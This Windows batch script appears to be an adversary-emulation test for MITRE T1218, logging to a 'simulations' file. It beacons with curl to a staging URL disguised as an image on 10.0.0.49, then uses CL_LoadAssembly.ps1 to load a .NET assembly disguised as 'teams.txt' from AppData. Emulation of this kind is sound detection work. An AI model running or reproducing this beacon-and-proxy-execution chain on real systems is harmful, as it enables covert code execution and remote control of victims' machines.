@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9426\e635f4f3
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9426-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=teams.txt
SET ewjmdkff=9426
SET ppojz=%APPDATA%\!pudaazx!\macula-simulations.log
SET jxxdf=%APPDATA%\!pudaazx!
SET ybqwx=1
SET mmkrz=

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: script_start=initialized>> "!ppojz!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start=!drguvr!>> "!ppojz!" 2>nul
curl -k -s -o nul "!drguvr!"
if errorlevel 1 (SET ybqwx=0&SET mmkrz=curl_failed)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete=!errorlevel!>> "!ppojz!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: dll_exec_start=!syjfr!>> "!ppojz!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\CL_LoadAssembly.ps1 "!pjkcpgw!\!syjfr!" Program::Dale
if errorlevel 1 (SET ybqwx=0&SET mmkrz=assembly_load_failed)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: dll_exec_complete=!errorlevel!>> "!ppojz!" 2>nul

SET nduvp=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,2!
echo [!nduvp!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!ybqwx!:!mmkrz!>> "!ppojz!" 2>nul